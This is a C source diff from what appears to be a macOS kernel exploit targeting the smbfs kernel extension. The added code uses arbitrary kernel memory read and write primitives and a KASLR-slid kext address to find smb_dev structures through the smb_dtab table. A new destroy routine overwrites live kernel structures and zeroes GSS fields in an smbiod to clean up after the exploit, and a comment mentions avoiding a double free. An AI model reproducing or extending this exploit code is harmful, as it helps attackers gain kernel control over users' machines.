@@ -11,8 +11,13 @@
 
 #include <dispatch/dispatch.h>
 
+#include <sys/stat.h>
+
+#include <xe/memory/kmem.h>
+#include <xe/slider/kext.h>
 #include <xe/util/log.h>
 #include <xe/util/assert.h>
+#include <xe/xnu/proc.h>
 
 #include "memory/allocator_rw.h"
 #include "memory/allocator_nrnw.h"
@@ -192,7 +197,7 @@ struct smb_dev_rw* smb_dev_rw_create_from_capture(const struct sockaddr_in* smb_
         xe_assert_err(error);
         
         struct smb_dev smb_dev;
-        error = smb_client_ioc_auth_info(dev_rw->fd_rw, (char*)&smb_dev, 48, NULL, UINT32_MAX, NULL);
+        error = smb_client_ioc_auth_info(dev_rw->fd_rw, (char*)&smb_dev, 48, NULL, 0, NULL);
         xe_assert_err(error);
         
         if (smb_dev.sd_flags & NSMBFL_CANCEL) {
@@ -340,7 +345,7 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t* dev1_p,
         abort();
     }
     
-    xe_log_debug("all done");
+    xe_log_debug("smb_dev_rw created with %d active backends", dev1_ok + dev2_ok);
     
     smb_dev_rw_shared_session_unref(&session);
     kmem_allocator_rw_destroy(&capture_allocator);
@@ -443,7 +448,53 @@ uintptr_t smb_dev_rw_get_session(smb_dev_rw_t dev) {
     return (uintptr_t)smb_dev.sd_session;
 }
 
-void smb_dev_rw_destroy(smb_dev_rw_t rw) {
-    xe_log_error("todo");
-    abort();
+
+uintptr_t smb_dev_rw_fd_to_dev(xe_slider_kext_t slider, int fd) {
+    struct stat dev_stat;
+    int res = fstat(fd, &dev_stat);
+    xe_assert_errno(res);
+    dev_t dev = dev_stat.st_dev;
+    
+    uintptr_t smb_dtab = xe_slider_kext_slide(slider, XE_KEXT_SEGMENT_DATA, KEXT_SMBFS_VAR_SMB_DTAB_DATA_OFFSET);
+    
+    return xe_kmem_read_ptr(smb_dtab, minor(dev) * sizeof(uintptr_t));
+}
+
+
+void smb_dev_rw_destroy(smb_dev_rw_t* rw_p) {
+    smb_dev_rw_t rw = *rw_p;
+    
+    xe_slider_kext_t slider = xe_slider_kext_create("com.apple.filesystems.smbfs", XE_KC_BOOT);
+    
+    if (rw->fd_dev >= 0) {
+        struct smb_dev restore_dev;
+        restore_dev.sd_rwlock.opaque[0] = 0x420000;
+        restore_dev.sd_rwlock.opaque[1] = 0;
+        restore_dev.sd_devfs = rw->backup.sd_devfs;
+        restore_dev.sd_flags = NSMBFL_OPEN;
+        restore_dev.sd_share = NULL;
+        restore_dev.sd_session = NULL;
+        
+        uintptr_t smb_dev = smb_dev_rw_fd_to_dev(slider, rw->fd_dev);
+        xe_kmem_write(smb_dev, 0, &restore_dev, sizeof(restore_dev));
+        close(rw->fd_dev);
+    }
+    
+    if (rw->fd_rw >= 0) {
+        uintptr_t smb_dev = smb_dev_rw_fd_to_dev(slider, rw->fd_rw);
+        uintptr_t smb_session = xe_kmem_read_ptr(smb_dev, offsetof(struct smb_dev, sd_session));
+        uintptr_t iod = xe_kmem_read_ptr(smb_session, TYPE_SMB_SESSION_MEM_SESSION_IOD_OFFSET);
+        // TODO: only one of them will cause double free
+        xe_kmem_write_uint64(iod, offsetof(struct smbiod, iod_gss.gss_spn), 0);
+        xe_kmem_write_uint32(iod, offsetof(struct smbiod, iod_gss.gss_spn_len), 0);
+        xe_kmem_write_uint64(iod, offsetof(struct smbiod, iod_gss.gss_cpn), 0);
+        xe_kmem_write_uint32(iod, offsetof(struct smbiod, iod_gss.gss_cpn_len), 0);
+        close(rw->fd_dev);
+    }
+    
+    smb_dev_rw_shared_session_unref(&rw->session);
+    
+    xe_slider_kext_destroy(&slider);
+    free(rw);
+    *rw_p = NULL;
 }
